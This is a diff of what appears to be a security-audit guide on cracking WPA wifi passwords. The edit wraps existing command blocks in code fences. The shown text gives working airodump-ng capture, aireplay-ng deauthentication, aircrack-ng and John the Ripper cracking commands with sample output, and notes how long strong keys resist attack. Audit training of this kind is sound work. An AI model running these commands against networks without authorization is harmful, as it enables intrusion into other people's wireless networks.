@@ -6,6 +6,7 @@ See the Dictionary Creation example under Preparation for details on password di
 
 **Step 2:** The attacker would then begin recording all (encrypted) wireless traffic associated with the organization’s access point:
 
+```
 $ sudo airodump-ng -c 1 --bssid 1A:2B:3C:4D:5E:6F -w sampleorg_airodump mon0
 
  CH  1 ][ Elapsed: 12 mins ][ 2012-01-23 12:34 ][ fixed channel mon0: -1                                                   
@@ -27,6 +28,7 @@ $ aireplay-ng -0 1 -a 1A:2B:3C:4D:5E:6F -c AB:CD:EF:AB:CD:EF mon0
 
  15:54:48  Waiting for beacon frame (BSSID: 1A:2B:3C:4D:5E:6F) on channel -1
  15:54:49  Sending 64 directed DeAuth. STMAC: [AB:CD:EF:AB:CD:EF] [ 5| 3 ACKs]
+```
 
 The goal of this step is to capture the cryptographic handshake that occurs when the targeted client reconnects. Try using different clients if the first one doesn't work, or try (physically) moving around. 
 
@@ -38,17 +40,19 @@ This handshake does not contain the WPA key itself, but once the the complete ha
 
 A good wordlist with a few tweaks tends to break most passwords.  Using a collection of all english words, all words from the language of the organization being audited, plus a combination of all these words, plus relevant keywords, addresses, and years tends to crack most wifi passwords.
 
-$ aircrack-ng -w pwdpairs.txt -b 1A:2B:3C:4D:5E:6F sampleorg_airodump*.cap
-
+```bash
+    $ aircrack-ng -w pwdpairs.txt -b 1A:2B:3C:4D:5E:6F sampleorg_airodump*.cap
+```
 
 ### Using a combination of brute forcing, wordlists and roles with John the Ripper (JtR) ###
 
 
 For WPA captures, John can either feed in to an aircrack process or attach a capture directly.  For captures, you first have to convert the .cap file (from wireshark, wifite, airodump, etc.) to a format that John likes.  The Jumbo version we use has conversion tools for this available: 
 
+```bash
   $wpapcap2john wpa.cap > crackme
   $./john -w:password.lst -fo=wpapsk-cuda crackme 
-
+```
 
 ### Brute force, using crunch ###
 
@@ -62,6 +66,7 @@ For practice on any of these methods, you can use the wpa-Induction.pcap file fr
 
 Successful password cracking via piping these into aircrack-ng:
 
+```
  Opening sampleorg_airodump-01.cap
  Reading packets, please wait...
                                  Aircrack-ng 1.1
@@ -77,6 +82,7 @@ Successful password cracking via piping these into aircrack-ng:
                        D6 F5 0A D1 3B FB 39 40 19 C9 BA 65 2E 49 3D 14 
 
       EAPOL HMAC     : F1 DF 09 C4 5A 96 0B AD 83 DD F9 07 4E FA 19 74 
+```
 
 The fourth line of the above output provides some useful information about the effectiveness of a strong WPA key. That rate of approximately 2000 keys per second means that a full-on, brute-force attack against a similar-length key that was truly random (and therefore immune to dictionary-based attacks) would take about 70^9 or 20 trillion seconds, which is well over 600,000 years. Or, for those who favor length and simplicity over brevity and complexity, a key containing four words chosen from among the 10,000 most common English dictionary words would still take approximately 150,000 years to crack (using this method on an average laptop).
 
